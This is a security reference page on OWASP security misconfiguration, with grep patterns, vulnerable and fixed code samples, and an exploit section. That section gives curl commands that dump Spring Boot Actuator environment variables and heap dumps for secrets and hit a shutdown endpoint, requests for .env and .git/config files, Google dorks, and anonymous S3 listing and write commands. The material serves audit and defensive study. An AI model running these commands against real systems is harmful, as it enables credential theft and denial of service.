# Security Misconfiguration & Default Settings

**Tags:** #high #misconfiguration #debug #cloud #actuator #infrastructure
**OWASP:** A02:2025 Security Misconfiguration
**CVSS Base:** 5.0 — 9.8 (Critical → if Actuator heapdump or debug mode exposes credentials)

---

## 📖 What is it

Security Misconfiguration occurs when an application, server, or cloud service is deployed with insecure default settings, verbose error messages, active debug codes, or open directory listings. It is the most common vulnerability across all tested applications.

Instead of writing vulnerable code, the developers or DevOps engineers simply forgot to "lock the doors" before moving to production.

---

## 🎯 OWASP 2025 Scenarios & Vectors

### 1. Active Debug & Verbose Errors (CWE-489)
The application server's configuration allows detailed error messages, such as stack traces, to be returned to users. This exposes sensitive component versions, internal paths, and sometimes database connection strings.

### 2. Default Accounts & Sample Apps (CWE-16)
The server comes with sample applications or management interfaces (e.g., Tomcat Manager, Jenkins, Spring Boot Actuators) exposed to the internet. The default accounts (`admin:admin`, `tomcat:tomcat`) weren't changed, leading to immediate RCE or takeover.

### 3. Directory Listing (CWE-548)
Directory listing is not disabled on the web server (Apache/Nginx). An attacker browses directly to `/backup/` or `/classes/` and downloads compiled code or SQL dumps, which they reverse-engineer to find severe flaws.

### 4. Open Cloud Storage / S3 Buckets
A cloud service provider (CSP) defaults to having sharing permissions open to the Internet. Attackers use automated tools to enumerate S3 buckets and read/write sensitive data.

---

## 🔍 `grep_search` Tactics

```
# Look for Debug flags in config files
DEBUG=True
APP_DEBUG=true
debug: true

# Look for hardcoded default credentials
admin:admin
password=password
spring.security.user.password=

# Look for dangerous exposed endpoints / actuators
/actuator/env
/server-status
/manager/html

# Look for permissive Cloud Storage configs (Terraform/AWS)
"public-read"
"public-read-write"
BlockPublicAcls = false
```

---

## 💣 Vulnerable Patterns

```python
#  VULNERABLE — Django/Flask (Production config)
# settings.py
DEBUG = True
ALLOWED_HOSTS = ['*']

# If an exception occurs, the user sees the full stack trace and local variables.
```

```javascript
//  VULNERABLE — Express (Error handling)
app.use((err, req, res, next) => {
    // Leaking the entire stack trace to the client
    res.status(500).send(err.stack);
});
```

```hcl
#  VULNERABLE — Terraform AWS S3 Bucket
resource "aws_s3_bucket" "b" {
  bucket = "company-sensitive-data"
  acl    = "public-read" # Anyone on the internet can read this bucket
}
```

---

## ✅ Correct Patterns

```python
#  CORRECT — Django
# settings.py
import os
DEBUG = os.environ.get('DEBUG', 'False') == 'True'
ALLOWED_HOSTS = ['myproductiondomain.com']
```

```javascript
//  CORRECT — Express
app.use((err, req, res, next) => {
    console.error(err.stack); // Log internally
    res.status(500).send('An unexpected error occurred. Please try again later.');
});
```

---

## 💣 Exploit Techniques

### 1. Spring Boot Actuator Exploitation (Priority Target)
If `/actuator` is exposed, the attack surface escalates from info-leak to near-RCE.

```bash
# Phase 1: Enumerate all exposed actuator endpoints
curl -s http://target.com/actuator | jq '.links'

# Phase 2: Dump environment variables (DB passwords, API keys, cloud credentials)
curl -s http://target.com/actuator/env | jq '._links | to_entries[] | select(.value.href | contains("env"))'
# Look for: spring.datasource.password, AWS_SECRET_ACCESS_KEY, JWT_SECRET

# Phase 3: Heap dump - extract secrets from live JVM memory
curl -o heapdump http://target.com/actuator/heapdump
# Parse with Eclipse Memory Analyzer (MAT) or:
strings heapdump | grep -iE "password|secret|token|key" | head -50

# Phase 4: Change log level to TRACE → forces verbose output leaking SQL queries
curl -X POST http://target.com/actuator/loggers/ROOT \
  -H 'Content-Type: application/json' \
  -d '{"configuredLevel": "TRACE"}'

# Phase 5: Shutdown endpoint (DoS if enabled)
curl -X POST http://target.com/actuator/shutdown
```

**Static Detection:** `grep_search` for `management.endpoints.web.exposure.include=*` or `management.endpoint.shutdown.enabled=true` in `application.properties`.

**False Positive Guard:** If the application is behind authentication middleware that restricts `/actuator/*` to internal network IPs only, severity reduces to Low. Always confirm accessibility first.

### 2. `.env` and Config File Discovery
```bash
# Common locations to try during audits
curl http://target.com/.env
curl http://target.com/.env.backup
curl http://target.com/config/database.yml
curl http://target.com/wp-config.php.bak
curl http://target.com/.git/config # → git credentials

# Automated wordlist approach
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -e .env,.bak,.backup,.old,.yml,.conf
```

### 3. Google Dorking for Directory Listings
```
intitle:"index of" "database.yml"
intitle:"index of" inurl:backup
intitle:"index of" ".env"
site:target.com ext:log
site:target.com ext:sql
```

### 4. S3 Bucket Enumeration
```bash
# Direct test (no-sign = anonymous request)
aws s3 ls s3://company-production-assets --no-sign-request

# If writable, insert a canary file
aws s3 cp test.txt s3://company-bucket/AUDIT_TEST.txt --no-sign-request

# Automated enumeration tools
grayhatwarfare.com  # passive bucket hunting
buckets.grayhatwarfare.com
```

---

## 📌 References
- [OWASP A02:2025 Security Misconfiguration](https://owasp.org/Top10/)
- [[iac-security-docker-kubernetes-terraform]]
- [[http-security-headers]]
- [[cors-misconfiguration]]
- [[xml-external-entity-xxe]]
